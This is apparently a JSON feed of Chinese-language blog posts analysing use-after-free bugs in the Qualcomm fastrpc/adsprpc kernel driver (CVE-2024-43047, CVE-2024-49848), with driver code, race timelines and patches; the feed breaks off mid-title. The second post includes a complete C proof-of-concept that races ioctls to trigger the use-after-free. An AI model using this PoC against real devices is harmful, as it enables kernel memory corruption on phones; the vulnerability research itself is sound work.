{"posts":[{"title":"CVE-2024-43047 (ITW) Map collision leads to UAF on 4.x kernels, and some 5.x kernel configurations","content":"经过前面的分析，CVE-2024-33060 和 CVE-2024-49848 极有可能是攻击者实际在野利用的漏洞。但有两个矛盾点： 若漏洞触发的是 CVE-2024-33060，理论上应产生某些内核日志，但实际攻击样本（ITW artifacts）中未见此类记录。 CVE-2024-49848 的影响范围仅限于更新版本的内核，与攻击目标内核版本不匹配。 所以，P0专家继续审计，发现CVE-2024-43047。 漏洞 context对map引用的处理方式取决于该映射是作为缓冲区（buffer）还是句柄（handle）使用。context通过一个动态分配的数组 ctx-&gt;maps 来存储映射指针的引用，该数组同时包含缓冲区和句柄的引用。 // 获取内核调用参数并管理映射引用 static int get_args(uint32_t kernel, struct smq_invoke_ctx *ctx) { ... uint32_t sc = ctx-&gt;sc; int inbufs = REMOTE_SCALARS_INBUFS(sc); int outbufs = REMOTE_SCALARS_OUTBUFS(sc); int handles, bufs = inbufs + outbufs; // 第一阶段：处理缓冲区（buffers）引用 for (i = 0; i &lt; bufs; ++i) { ... if (ctx-&gt;fds &amp;&amp; (ctx-&gt;fds[i] != -1)) // 创建映射并关联到 ctx-&gt;maps[i] err = fastrpc_mmap_create(ctx-&gt;fl, ctx-&gt;fds[i], NULL, ctx-&gt;attrs[i], buf, len, mflags, &amp;ctx-&gt;maps[i]); if (ctx-&gt;maps[i]) ctx-&gt;maps[i]-&gt;ctx_refs++; // 引用计数递增 ... } // 第二阶段：处理句柄（handles）引用 handles = REMOTE_SCALARS_INHANDLES(sc) + REMOTE_SCALARS_OUTHANDLES(sc); for (i = bufs; i &lt; bufs + handles; i++) { ... if (!dsp_cap_ptr-&gt;dsp_attributes[DMA_HANDLE_REVERSE_RPC_CAP] &amp;&amp; ctx-&gt;fds &amp;&amp; (ctx-&gt;fds[i] != -1)) // 创建DMA句柄映射（属性强制为FASTRPC_ATTR_NOVA） err = fastrpc_mmap_create(ctx-&gt;fl, ctx-&gt;fds[i], NULL, FASTRPC_ATTR_NOVA, 0, 0, dmaflags, &amp;ctx-&gt;maps[i]); // 无论是否创建成功，均尝试递增引用计数 if (!err &amp;&amp; ctx-&gt;maps[i]) ctx-&gt;maps[i]-&gt;ctx_refs++; // 错误处理：仅回滚句柄部分的映射 if (err) { for (j = bufs; j &lt; i; j++) { // 注意：j从bufs开始，未覆盖缓冲区映射！ if (ctx-&gt;maps[j] &amp;&amp; ctx-&gt;maps[j]-&gt;ctx_refs) ctx-&gt;maps[j]-&gt;ctx_refs--; fastrpc_mmap_free(ctx-&gt;maps[j], 0); // 释放映射 } ... } ... } mutex_unlock(&amp;ctx-&gt;fl-&gt;map_mutex); } 然而，只有缓冲区（buffers）会通过 ctx-&gt;maps 中的指针引用被释放。实际上，一旦句柄映射（handle maps）被成功初始化，其在 ctx-&gt;maps 中的引用便不再被使用。相反，DSP会获取与映射文件描述符关联的值的列表，并在使用完成后将这些文件描述符传回AP的 adsprpc 驱动。随后，AP 会查找与 DSP 返回的文件描述符关联的映射，并减少其引用计数，最终可能释放该映射： static int put_args(uint32_t kernel, struct smq_invoke_ctx *ctx, remote_arg_t *upra) { ... for (i = 0; i &lt; M_FDLIST; i++) { if (!fdlist[i]) break; if (!fastrpc_mmap_find(ctx-&gt;fl, (int)fdlist[i], NULL, 0, 0, 0, 0, &amp;mmap)) { if (mmap &amp;&amp; mmap-&gt;ctx_refs) mmap-&gt;ctx_refs--; fastrpc_mmap_free(mmap, 0); } } ... } 此逻辑存在缺陷，因为无法保证 put_args 中找到并减少引用计数的映射与 get_args 先前引用的映射是同一个。实际上，它可能是另一个上下文中仍作为缓冲区引用的映射。 当存在映射碰撞（多个映射满足 fastrpc_mmap_find 的搜索条件）时，此漏洞将被触发。由于 fastrpc_mmap_find 会返回包含目标虚拟地址范围的任何映射，攻击者可以通过创建范围覆盖现有映射的“超集映射”来引发碰撞。例如：mapB-&gt;va == mapA-&gt;va &amp;&amp; mapB-&gt;len &gt; mapA-&gt;len An example of this map collision that leads to memory corruption is: Create a small mapping A with va == 0 using fastrpc_internal_mmap Create context 1, get_args gets a reference to mapping A as a handle. Create a BIG second mapping B with va == 0 using fastrpc_internal_mmap with the same fd as mapping A. Create context 2, grab a reference to mapping B as a buffer (vs a handle) so that we use the ctx-&gt;maps pointer. Complete context 1, causing put_args to be called. We find and drop a refcount on mapping B since it collides with mapping A. Mapping A’s refcount is permanently leaked. We then unmap mapping B using FASTRPC_IOCTL_MUNMAP Now there is a still valid context (context 2 in the above example) that still has a reference to mapping B even though mapping B was freed. 1. 创建映射碰撞 ctx1 -- mapping A （va=0, ctx_ref+1） ctx2 -- mapping B (va=0, 范围更大， ctx_ref+1) 2. 错误put ctx1 put_args，错误找到 mapping B，并ctx_ref--（此时mapping A的引用计数永久泄漏，无法再被释放） 3. 释放 unmap mapping B 释放 4. uaf ctx2 仍持有mapping B的引用，UAF PoC 猜测是因为在野利用，没公开 Patch 参考文献 https://googleprojectzero.blogspot.com/2024/12/qualcomm-dsp-driver-unexpectedly-excavating-exploit.html ","link":"https://lzxzl.github.io/post/cve-2024-43047-itw-map-collision-leads-to-uaf-on-4x-kernels-and-some-5x-kernel-configurations/"},{"title":"CVE-2024-49848 FASTRPC_ATTR_KEEP_MAP logic bug allows fastrpc_internal_munmap_fd to racily free in-use mappings leading to UAF","content":" FASTRPC_ATTR_KEEP_MAP 的逻辑漏洞导致 fastrpc_internal_munmap_fd 在竞态条件下释放仍在使用中的内存映射，导致 UAF。 在 fastrpc_internal_mem_unmap 和 fastrpc_internal_munmap 函数中，一个至关重要的逻辑是它们依赖 fastrpc_mmap_remove 来查找需要删除的内存映射。 ioctl(FASTRPC_IOCTL_MEM_UNMAP) fastrpc_device_ioctl() fastrpc_mmap_device_ioctl() fastrpc_internal_mem_unmap() fastrpc_mmap_remove() – 查找并删除映射记录 fastrpc_mem_unmap_to_dsp() – 向 DSP 发起卸载请求 fastrpc_mmap_free() – 释放映射结构资源 ioctl(FASTRPC_IOCTL_MUNMAP) fastrpc_device_ioctl fastrpc_mmap_device_ioctl fastrpc_internal_munmap fastrpc_mmap_remove fastrpc_munmap_on_dsp fastrpc_mmap_free 函数fastrpc_mmap_remove通过一系列检查试图确保不会释放当前仍被使用的map： // 调用此函数时需持有文件映射的互斥锁 （fl mapping mutexes） static int fastrpc_mmap_remove(struct fastrpc_file *fl, int fd, uintptr_t va, size_t len, struct fastrpc_mmap **ppmap) { struct fastrpc_mmap *match = NULL, *map; struct hlist_node *n; struct fastrpc_apps *me = &amp;gfa; unsigned long irq_flags = 0; ... // 遍历全局映射链表 me-&gt;maps hlist_for_each_entry_safe(map, n, &amp;me-&gt;maps, hn) { // 1. 映射的文件描述符 map-&gt;fd 是否等于参数 fd // 2. 映射的起始地址 map-&gt;raddr 是否与参数 va 相同 // 3. 映射的长度 map-&gt;len 与参数 len 是否匹配 // 4. 仅有 1 个引用（来自映射创建时的初始引用） // 5. 该映射不是用于fastrpc shell的特殊内存 if ((fd &lt; 0 || map-&gt;fd == fd) &amp;&amp; map-&gt;raddr == va &amp;&amp; map-&gt;raddr + map-&gt;len == va + len &amp;&amp; map-&gt;refs == 1 &amp;&amp; /* Skip unmap if it is fastrpc shell memory */ !map-&gt;is_filemap) { match = map; hlist_del_init(&amp;map-&gt;hn); break; } } ... // 遍历该文件对应的映射链表 fl-&gt;maps hlist_for_each_entry_safe(map, n, &amp;fl-&gt;maps, hn) { // 1. 映射的文件描述符 map-&gt;fd 是否等于参数 fd // 2. 映射的起始地址 map-&gt;raddr 是否与参数 va 相同 // 3. 映射的长度 map-&gt;len 与参数 len 是否匹配 // 4. 仅有 1 个引用（来自映射创建时的初始引用） // 5. 没有上下文（context）引用该映射 // 6. 该映射不是用于fastrpc shell的特殊内存 if ((fd &lt; 0 || map-&gt;fd == fd) &amp;&amp; map-&gt;raddr == va &amp;&amp; map-&gt;raddr + map-&gt;len == va + len &amp;&amp; map-&gt;refs == 1 &amp;&amp; /* 仅在无其他引用且无上下文引用时移除 */ !map-&gt;ctx_refs &amp;&amp; // 确保没有上下文持有引用（因为上下文创建也可能生成映射） /* 跳过属于 fastrpc shell 内存的映射 */ !map-&gt;is_filemap) { match = map; hlist_del_init(&amp;map-&gt;hn); break; } } if (match) { *ppmap = match; return 0; } return -ETOOMANYREFS; } 该函数在遍历本地映射list时，试图确保： map-&gt;refs == 1 该映射对象只有一个引用（即没有其他地方持有此映射）。如果引用计数不为1，说明仍有其他地方在使用该映射，不应删除。 !map-&gt;ctx_refs 意味着没有上下文（context）引用该映射。也就是说，没有某个RPC调用或上下文正在用这个映射传递参数，如果存在上下文引用就不应删除。 !map-&gt;is_filemap 该映射不是用于fastrpc shell的特殊内存。如果它是shell映射，这部分内存不应被解除映射。 而遍历全局映射list时，试图确保满足上述第1和3个条件。 总结来说，fastrpc_mmap_remove函数执行期间，不能有任何并发操作会让其他地方在map-&gt;refs==1的情况下临时持有这个map。然而，前面的 CVE-2024-33060 恰好打破了这一假设： 线程 A: fastrpc_internal_mmap → 分配map → 插入全局链表 → （尚未完成，继续map的其他操作） -- map的refs为1 线程 B: fastrpc_internal_munmap 查找到这个 map，开始释放 → 释放完成 -- 调用remove函数找到这个map，此时map的refs为1，同时线程A还持有这个map 线程 A 继续操作 map 时，就会访问到已被释放或复用的内存。 1 漏洞 换句话来说这个假设：在释放一个map的时候，必须保证本地引用计数refs==1和上下文引用计数ctx_refs==0，这种情况下去释放才是正确的。这个漏洞就是在另外一条路径上打破了这个假设。 fastrpc_mmap_remove函数里的假设已经被 CVE-2024-33060 打破了，那别的map释放路径呢？ 至少还存在另外两种不依赖 fastrpc_mmap_remove 及其保护逻辑的map释放路径。其中之一是 fastrpc_internal_munmap_fd。 该函数通过 fastrpc_mmap_find 查找映射，若找到，且其包含 FASTRPC_ATTR_KEEP_MAP 标志，则调用 fastrpc_mmap_free 释放该映射，并清除标志位（确保无法重复调用）。 /* * fastrpc_internal_munmap_fd 仅适用于通过持久化属性（persist）映射的缓冲区。 * 对同一持久化缓冲区，此函数只能调用一次。 */ int fastrpc_internal_munmap_fd(struct fastrpc_file *fl, struct fastrpc_ioctl_munmap_fd *ud) { int err = 0; struct fastrpc_mmap *map = NULL; ... mutex_lock(&amp;fl-&gt;internal_map_mutex); mutex_lock(&amp;fl-&gt;map_mutex); // 1. 查找映射 err = fastrpc_mmap_find(fl, ud-&gt;fd, NULL, ud-&gt;va, ud-&gt;len, 0, 0, &amp;map); if (err) { ... mutex_unlock(&amp;fl-&gt;map_mutex); goto bail; } // 2. 如果找到，且其包含 FASTRPC_ATTR_KEEP_MAP 标志 if (map &amp;&amp; (map-&gt;attr &amp; FASTRPC_ATTR_KEEP_MAP)) { map-&gt;attr = map-&gt;attr &amp; (~FASTRPC_ATTR_KEEP_MAP); //清除标志位 fastrpc_mmap_free(map, 0); //释放映射 } mutex_unlock(&amp;fl-&gt;map_mutex); bail: mutex_unlock(&amp;fl-&gt;internal_map_mutex); return err; } 然而，在 fastrpc_mmap_create 函数中存在一段与引用计数相关的特殊逻辑。可以观察到： 只有走else分支，map-&gt;refs 才会增加到2。 无论 mflags 的值如何，用户均可设置 FASTRPC_ATTR_KEEP_MAP 标志。 这意味着可以创建一个带有 FASTRPC_ATTR_KEEP_MAP 标志但 map-&gt;refs == 1 的映射。这种情况下，fastrpc_internal_munmap_fd能够发现该映射并调用fastrpc_mmap_free释放。 static int fastrpc_mmap_create(...) { ... map = kzalloc(sizeof(*map), GFP_KERNEL); ... map-&gt;refs = 1; //初始引用为1 map-&gt;attr = attr; ... if (mflags == ADSP_MMAP_HEAP_ADDR || mflags == ADSP_MMAP_REMOTE_HEAP_ADDR) { ... } else if (mflags == FASTRPC_MAP_FD_NOMAP) { ... } else { if (map-&gt;attr &amp;&amp; (map-&gt;attr &amp; FASTRPC_ATTR_KEEP_MAP)) { ADSPRPC_INFO(&quot;buffer mapped with persist attr 0x%x\\n&quot;, (unsigned int)map-&gt;attr); map-&gt;refs = 2; //若设置了 KEEP_MAP 标志，引用计数增至2 } ... } ... fastrpc_mmap_add(map); //将映射添加到链表 *ppmap = map; ... } 但此时仍无法保证释放的假设，如fastrpc_mmap_remove 中的（ refs == 1 且 ctx_refs == 0）未被破坏。这种矛盾可能引发严重问题，例如当某个上下文通过 get_args 函数获取对 FASTRPC_ATTR_KEEP_MAP 映射的引用时（ctx_refs&gt;0）： static int get_args(uint32_t kernel, struct smq_invoke_ctx *ctx) { remote_arg64_t *rpra, *lrpra; remote_arg_t *lpra = ctx-&gt;lpra; ... int mflags = 0; ... for (i = 0; i &lt; bufs; ++i) { uintptr_t buf = (uintptr_t)lpra[i].buf.pv; size_t len = lpra[i].buf.len; mutex_lock(&amp;ctx-&gt;fl-&gt;map_mutex); if (ctx-&gt;fds &amp;&amp; (ctx-&gt;fds[i] != -1)) // 可能获取对现有映射的引用（若已存在） err = fastrpc_mmap_create(ctx-&gt;fl, ctx-&gt;fds[i], NULL, ctx-&gt;attrs[i], buf, len, mflags, &amp;ctx-&gt;maps[i]); if (ctx-&gt;maps[i]) ctx-&gt;maps[i]-&gt;ctx_refs++; // 增加上下文引用计数 mutex_unlock(&amp;ctx-&gt;fl-&gt;map_mutex); ... } } 此时，map-&gt;ctx_refs 大于零，但这无法阻止 fastrpc_internal_munmap_fd 调用 fastrpc_mmap_free 释放map。具体来看 fastrpc_mmap_free 的实现： static void fastrpc_mmap_free(struct fastrpc_mmap *map, uint32_t flags) { ... if (map-&gt;flags == ADSP_MMAP_HEAP_ADDR || map-&gt;flags == ADSP_MMAP_REMOTE_HEAP_ADDR) { ... } else { map-&gt;refs--; // 减少引用计数 // 仅当 refs=0 且 ctx_refs=0 时从链表中移除映射 if (!map-&gt;refs &amp;&amp; !map-&gt;ctx_refs) hlist_del_init(&amp;map-&gt;hn); // 仅在 refs &gt; 0 且 flags=0 时避免释放映射 —— ctx_refs 不影响释放决策！ if (map-&gt;refs &gt; 0 &amp;&amp; !flags) return; } ... bail: if (!map-&gt;is_persistent) kfree(map); // 在此处释放映射内存！ } 因此，若存在以下场景：某个 fastrpc 上下文（context）持有唯一引用的 FASTRPC_MAP_FD_NOMAP 映射（且设置了 FASTRPC_ATTR_KEEP_MAP 属性），则可能触发 UAF。 虽然通过 fastrpc_internal_mem_map 可以构造这种flag与attr的组合，但如何让上下文成为映射的唯一引用者并不直观。通常，ctx持有map唯一引用的场景仅出现在“ctx创建与初始化直接触发map创建”时，但在此默认路径中，无法指定必要的flag与attr组合以构造漏洞场景。因此，我们需要以下步骤： **通过 fastrpc_internal_mem_map 创建map； 让某个ctx获取该map的引用； 以某种方式丢弃map创建时的初始引用。 由于 fastrpc_internal_mem_unmap 受 fastrpc_mmap_remove 的保护无法实现此操作，但可以通过竞态条件利用 fastrpc_internal_mem_map 的异常退出路径达成目标： int fastrpc_internal_mem_map(struct fastrpc_file *fl, struct fastrpc_ioctl_mem_map *ud) { int err = 0; struct fastrpc_mmap *map = NULL; mutex_lock(&amp;fl-&gt;internal_map_mutex); ... mutex_lock(&amp;fl-&gt;map_mutex); // 在此处创建映射（初始引用为1） VERIFY(err, !(err = fastrpc_mmap_create(fl, ud-&gt;m.fd, NULL, ud-&gt;m.attrs, ud-&gt;m.vaddrin, ud-&gt;m.length, ud-&gt;m.flags, &amp;map))); mutex_unlock(&amp;fl-&gt;map_mutex); ... // 让某个上下文在此处获取映射引用 // 尝试将映射注册到 DSP（若失败则触发异常退出） VERIFY(err, !(err = fastrpc_mem_map_to_dsp(fl, ud-&gt;m.fd, ud-&gt;m.offset, ud-&gt;m.flags, map-&gt;va, map-&gt;phys, map-&gt;size, &amp;map-&gt;raddr))); if (err) goto bail; // 异常退出 ud-&gt;m.vaddrout = map-&gt;raddr; bail: if (err) { ... if (map) { mutex_lock(&amp;fl-&gt;map_mutex); // 释放映射（减少引用计数，若其他上下文持有引用则保留） fastrpc_mmap_free(map, 0); mutex_unlock(&amp;fl-&gt;map_mutex); } } mutex_unlock(&amp;fl-&gt;internal_map_mutex); return err; } 假设存在两个并发进程 A 和 B，执行以下操作序列： [A]: Completely fills the dsp address space with valid mappings using fastrpc_internal_mem_map [A]: Creates a FASTRPC_MAP_FD_NOMAP map with attribute FASTRPC_ATTR_KEEP_MAP using fastrpc_internal_mem_map and enters into fastrpc_mem_map_to_dsp (holding internal_map_mutex, dropped map_mutex) map-&gt;refs == 1, map-&gt;ctx_refs == 0 [B]: Invokes a call using FASTRPC_IOCTL_INVOKE2 and creates a context, get_args grabs the map mutex, finds and grabs a reference to map, drops the map mutex (not holding any mutexes) map-&gt;refs == 2, map-&gt;ctx_refs == 1 [A]: fastrpc_mem_map_to_dsp fails as the dsp address space is completely full, fastrpc_internal_mem_map bails out and calls fastrpc_mmap_free, dropping the internal_map_mutex (not holding any mutexes) map-&gt;refs == 1, map-&gt;ctx_refs == 1 [A]: Calls fastrpc_internal_munmap_fd grabs internal_map_mutex, and map_mutex, finds map with fastrpc_mmap_find, and calls fastrpc_mmap_free because the FASTRPC_ATTR_KEEP_MAP attribute is set map-&gt;refs == 0, map-&gt;ctx_refs == 1, mapping is kfree'd At the end of this sequence, an existing context still holds a reference to the freed map. 线程A 线程B fastrpc_internal_mem_map() 填满DSP 地址空间 fastrpc_internal_mem_map() // 用户态传入attr : FASTRPC_ATTR_KEEP_MAP // 用户态传入flags：FASTRPC_MAP_FD_NOMAP mutex_lock(&amp;fl-&gt;internal_map_mutex); mutex_lock(&amp;fl-&gt;map_mutex); fastrpc_mmap_create map-&gt;refs = 1; else if (mflags == FASTRPC_MAP_FD_NOMAP){…} mutex_unlock(&amp;fl-&gt;map_mutex);// 此时 map-&gt;refs == 1，map-&gt;ctx_refs == 0 fastrpc_mem_map_to_dsp(){ ioctl FASTRPC_IOCTL_INVOKE2 …… fastrpc_internal_invoke get_args mutex_lock(&amp;ctx-&gt;fl-&gt;map_mutex); fastrpc_mmap_create() // 获取对现有映射的引用 fastrpc_mmap_find() map-&gt;refs++; ctx-&gt;maps[i]-&gt;ctx_refs++; mutex_unlock(&amp;ctx-&gt;fl-&gt;map_mutex); // 此时 map-&gt;refs == 2, map-&gt;ctx_refs == 1 } // 因为DSP地址空间满了，失败，goto bail; fastrpc_mmap_free(map, 0); map-&gt;refs—; // 此时 map-&gt;refs == 1, map-&gt;ctx_refs == 1 mutex_unlock(&amp;fl-&gt;internal_map_mutex); fastrpc_internal_munmap_fd mutex_lock(&amp;fl-&gt;internal_map_mutex); mutex_lock(&amp;fl-&gt;map_mutex); fastrpc_mmap_find() if (map &amp;&amp; (map-&gt;attr &amp; FASTRPC_ATTR_KEEP_MAP)) { map-&gt;attr = map-&gt;attr &amp; (~FASTRPC_ATTR_KEEP_MAP); fastrpc_mmap_free(map, 0); map-&gt;refs—; // 此时 map-&gt;refs == 0, map-&gt;ctx_refs == 1 kfree(map); // 释放map } PoC #include &quot;adsprpc_shared.h&quot; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/wait.h&gt; #include &lt;linux/dma-heap.h&gt; #include &lt;sys/mman.h&gt; #include &lt;errno.h&gt; #include &lt;pthread.h&gt; #include &lt;signal.h&gt; #define FASTRPC_MODE_UNSIGNED_MODULE 8 #define FASTRPC_STATIC_HANDLE_PROCESS_GROUP (1) #define FASTRPC_STATIC_HANDLE_DSP_UTILITIES (2) #define FASTRPC_STATIC_HANDLE_LISTENER (3) #define FASTRPC_STATIC_HANDLE_CURRENT_PROCESS (4) int dma_heap; int adsprpc_fd; int create_and_init_adsprpc() { int adsprpc_fd = open(&quot;/dev/adsprpc-smd&quot;,O_RDONLY); if(adsprpc_fd == -1) { printf(&quot;open: %m\\n&quot;); return -1; } unsigned cid = 3; long ret = ioctl(adsprpc_fd,FASTRPC_IOCTL_GETINFO,&amp;cid); int shell_fd = open(&quot;/data/local/tmp/fastrpc_shell_unsigned_3&quot;,O_RDONLY); if(shell_fd == -1) { printf(&quot;open shell: %m\\n&quot;); return -1; } dma_heap = open(&quot;/dev/dma_heap/system&quot;,O_RDONLY); if(dma_heap == -1) { printf(&quot;open dma_heap: %m\\n&quot;); return -1; } struct dma_heap_allocation_data heap_data = { .len = 0x131000, .fd_flags = O_RDWR, }; ret = ioctl(dma_heap,DMA_HEAP_IOCTL_ALLOC,&amp;heap_data); if( ret &lt; 0 || heap_data.fd &lt; 0) { printf(&quot;dma heap allocation fail: %d %d %m\\n&quot;,ret,heap_data.fd); return -1; } void* shell_file_dma = mmap(NULL,0x131000,PROT_READ | PROT_WRITE, MAP_SHARED,heap_data.fd,0); long length = read(shell_fd,shell_file_dma,0x131000); if(length &lt;= 0) { printf(&quot;read: %d %m\\n&quot;,ret); return -1; } close(shell_fd); struct fastrpc_ioctl_init_attrs init = { .init = { .file = shell_file_dma, .filefd = heap_data.fd, .filelen = length, .mem = 0, .flags = FASTRPC_INIT_CREATE, }, .attrs = FASTRPC_MODE_UNSIGNED_MODULE }; ret = ioctl(adsprpc_fd,FASTRPC_IOCTL_INIT_ATTRS,&amp;init); if(ret &lt; 0) { printf(&quot;init_attrs: %d %m\\n&quot;,ret); return -1; } return adsprpc_fd; } pthread_barrier_t* barrier; pthread_t tid_inv,tid_int; unsigned long* value_loc; struct dma_heap_allocation_data heap_data = { .len = 0x10000, .fd_flags = O_RDWR, }; void handler(int signo, siginfo_t *info, void* context) { return; } sig_atomic_t jobid = 0; long submit_job() { unsigned value = 255; unsigned out_values[256] = {0}; struct fastrpc_ioctl_invoke_async ioctl_arg; remote_arg_t ra[2]; ra[0].buf.pv = (void *)&amp;value; ra[0].buf.len = sizeof(value); ra[1].buf.pv = (void *)(&amp;out_values[1]); ra[1].buf.len = value * sizeof(uint32_t); ioctl_arg.inv.handle = FASTRPC_STATIC_HANDLE_CURRENT_PROCESS; ioctl_arg.inv.sc = REMOTE_SCALARS_MAKE(0, 1, 1); ioctl_arg.inv.pra = ra; ioctl_arg.fds = NULL; ioctl_arg.attrs = NULL; ioctl_arg.crc = NULL; ioctl_arg.perf_kernel = NULL; ioctl_arg.perf_dsp = NULL; ioctl_arg.job = NULL; ioctl_arg.job = malloc(sizeof(*ioctl_arg.job)); ioctl_arg.job-&gt;isasyncjob = 1; ioctl_arg.job-&gt;jobid = jobid++; struct fastrpc_ioctl_invoke2 inv; inv.invparam = &amp;ioctl_arg; inv.req = FASTRPC_INVOKE2_ASYNC; inv.size = sizeof(struct fastrpc_ioctl_invoke_async); long ret = ioctl(adsprpc_fd,FASTRPC_IOCTL_INVOKE2,&amp;inv); printf(&quot;submit job ret: %lx %m\\n&quot;,ret); return ret; } void* thread_inv(void* arg) { while(1) { //Need to replace value with &amp; new map on other thread unsigned value = 255; unsigned out_values[256] = {0}; long ret; //Not using submit_job() to increase race precision struct fastrpc_ioctl_invoke_async ioctl_arg; remote_arg_t ra[2]; ra[0].buf.pv = (void *)0; ra[0].buf.len = sizeof(value); ra[1].buf.pv = (void *)(&amp;out_values[1]); ra[1].buf.len = value * sizeof(uint32_t); ioctl_arg.inv.handle = FASTRPC_STATIC_HANDLE_CURRENT_PROCESS; ioctl_arg.inv.sc = REMOTE_SCALARS_MAKE(0, 1, 1); ioctl_arg.inv.pra = ra; ioctl_arg.fds = calloc(REMOTE_SCALARS_LENGTH(ioctl_arg.inv.sc),sizeof(int)); ioctl_arg.fds[0] = heap_data.fd; ioctl_arg.fds[1] = -1; ioctl_arg.attrs = NULL; ioctl_arg.crc = NULL; ioctl_arg.perf_kernel = NULL; ioctl_arg.perf_dsp = NULL; ioctl_arg.job = malloc(sizeof(*ioctl_arg.job)); ioctl_arg.job-&gt;isasyncjob = 1; ioctl_arg.job-&gt;jobid = jobid++; struct fastrpc_ioctl_invoke2 inv; inv.invparam = &amp;ioctl_arg; inv.req = FASTRPC_INVOKE2_ASYNC; inv.size = sizeof(struct fastrpc_ioctl_invoke_async); close(heap_data.fd); pthread_barrier_wait(barrier); ret = ioctl(adsprpc_fd,FASTRPC_IOCTL_INVOKE2,&amp;inv); printf(&quot;job submit: %ld %m\\n&quot;,ret); fflush(stdout); if(!ret) { *((unsigned*) &amp;barrier[1]) = 1; pthread_barrier_wait(barrier); exit(0); } pthread_barrier_wait(barrier); } return NULL; } int main() { adsprpc_fd = create_and_init_adsprpc(); if(adsprpc_fd == -1) { printf(&quot;failed to open adsprpc...\\n&quot;); return 1; } barrier = mmap(NULL,0x1000,PROT_READ | PROT_WRITE,MAP_SHARED | MAP_ANONYMOUS,0,0); pthread_barrierattr_t attr; pthread_barrierattr_init(&amp;attr); pthread_barrierattr_setpshared(&amp;attr,PTHREAD_PROCESS_SHARED); pthread_barrier_init(barrier,&amp;attr,2); //pthread_create(&amp;tid_int,NULL,&amp;thread_interrupt,NULL); int ret = ioctl(dma_heap,DMA_HEAP_IOCTL_ALLOC,&amp;heap_data); if( ret &lt; 0 || heap_data.fd &lt; 0) { printf(&quot;dma heap allocation fail: %d %d %m\\n&quot;,ret,heap_data.fd); return -1; } // for(unsigned i = 0; i &lt; 1022; i++) { // if(submit_job() &lt; 0) { // printf(&quot;failed to submit a job at i = %u\\n&quot;,i); // exit(0); // } // } printf(&quot;mapping...\\n&quot;); fflush(stdout); value_loc = mmap(NULL,0x2000,PROT_READ | PROT_WRITE,MAP_PRIVATE,heap_data.fd,0); pid_t pid; if(!(pid = fork())) { thread_inv(NULL); exit(0); } // pthread_create(&amp;tid_inv,NULL,&amp;thread_inv,NULL); unsigned long spoof_map = 0x2000; uint64_t vaddrouts[1024]; unsigned top = 0; do { struct fastrpc_ioctl_mem_map mmap_struct = { .m = { .flags = 0, .fd = heap_data.fd, .length = 0x2000, .attrs = 0, .vaddrin = spoof_map, .vaddrout = 0, .offset = 0, } }; spoof_map += 0x2000; unsigned long ioret = ioctl(adsprpc_fd,FASTRPC_IOCTL_MEM_MAP,&amp;mmap_struct); printf(&quot;mem_map loop: %lx 0x%lx\\n&quot;,ioret,mmap_struct.m.vaddrout); vaddrouts[top] = mmap_struct.m.vaddrout; } while (vaddrouts[top++]); // struct fastrpc_ioctl_mem_map mmap_struct = { // .m = { // .flags = 0, // .fd = heap_data.fd, // .length = 0x1000, // .attrs = 0, // .vaddrin = value_loc, // .offset = 0, // } // }; // //pthread_barrier_wait(&amp;barrier); // unsigned long ioret = ioctl(adsprpc_fd,FASTRPC_IOCTL_MEM_MAP,&amp;mmap_struct); // printf(&quot;mem_map1: %lx 0x%lx\\n&quot;,ioret,mmap_struct.m.vaddrout); // struct fastrpc_ioctl_mem_unmap unmap_struct = { // .um = { // .fd = heap_data.fd, // .length = 0x1000, // .vaddr = mmap_struct.m.vaddrout // } // }; // ioret = ioctl(adsprpc_fd,FASTRPC_IOCTL_MEM_UNMAP,&amp;unmap_struct); // printf(&quot;mem_unmap1: %lx\\n&quot;,ioret); unsigned first = true; while(1) { struct fastrpc_ioctl_mem_map mmap_struct = { .m = { .flags = FASTRPC_MAP_FD_NOMAP, .fd = heap_data.fd, .length = 0x1000, .attrs = FASTRPC_ATTR_KEEP_MAP, .vaddrin = value_loc, .offset = -1, } }; pthread_barrier_wait(barrier); unsigned long ret = ioctl(adsprpc_fd,FASTRPC_IOCTL_MEM_MAP,&amp;mmap_struct); printf(&quot;mem_map2: %lx\\n&quot;,ret); fflush(stdout); struct fastrpc_ioctl_munmap_fd final_munmap = { .fd = heap_data.fd, .flags = 0, .len = 0x1000, .va = 0 }; unsigned long final_ret = ioctl(adsprpc_fd,FASTRPC_IOCTL_MUNMAP_FD,&amp;final_munmap); printf(&quot;munmap fd: %lx %m\\n&quot;,final_ret); pthread_barrier_wait(barrier); if(*(unsigned*)&amp;barrier[1]) { break; } if(first &amp;&amp; fgetc(stdin) == 'n') { kill(pid,SIGKILL); exit(0); } first = false; } // pthread_join(tid_int,NULL); // pthread_join(tid_inv,NULL); // for(unsigned i = 0; i &lt; top; i++) // { // struct fastrpc_ioctl_mem_unmap unmap_struct = { // .um = { // .fd = heap_data.fd, // .length = 0x2000, // .vaddr = vaddrouts[i], // } // }; // unsigned long ioret = ioctl(adsprpc_fd,FASTRPC_IOCTL_MEM_UNMAP,&amp;unmap_struct); // if(ioret) // printf(&quot;unexpected unmap fail %lx %m\\n&quot;,ioret); // } // while(1) sleep(1); return 0; // struct fastrpc_ioctl_mmap mmap_struct2 = { // .fd = -1, // .flags = ADSP_MMAP_HEAP_ADDR, // .vaddrin = 0, // .size = 0x1000 // }; // ret = ioctl(adsprpc_fd,FASTRPC_IOCTL_MMAP,&amp;mmap_struct2); // if(ret &lt; 0) // { // printf(&quot;ret mmap: %lx %m\\n&quot;,ret); // } // printf(&quot;vaddrout: %lx %m\\n&quot;,mmap_struct2.vaddrout); } Patch dsp-kernel: Add attribute and flag checks during map creation A persistence map is expected to hold refs=2 during its creation. However, the Fuzzy test can create a persistence map by configuring a mismatch between attributes and flags using the KEEP MAP attribute and FD NOMAP flags. This sets the map reference count to 1. The user then calls fastrpc_internal_munmap_fd to free the map since it doesn't check flags, which can cause a use-after-free (UAF) for the file map and shared buffer. Add a check to restrict DMA handle maps with invalid attributes. 参考文献 https://googleprojectzero.blogspot.com/2024/12/qualcomm-dsp-driver-unexpectedly-excavating-exploit.html https://project-zero.issues.chromium.org/issues/42451725 https://git.codelinaro.org/clo/la/kernel/msm-5.10/-/commit/dff7593179b189f0ea55f0ad6ff2a153ffacf5b9 ","link":"https://lzxzl.github.io/post/cve-2024-49848-fastrpc_attr_keep_map-logic-bug-allows-fastrpc_internal_munmap_fd-to-racily-free-in-use-mappings-leading-to-uaf/"},{"title":"PZ Issue 42451713(fixed with CVE-2024-33060) - Incorrect searching algorithm in fastrpc_mmap_find leads to kernel 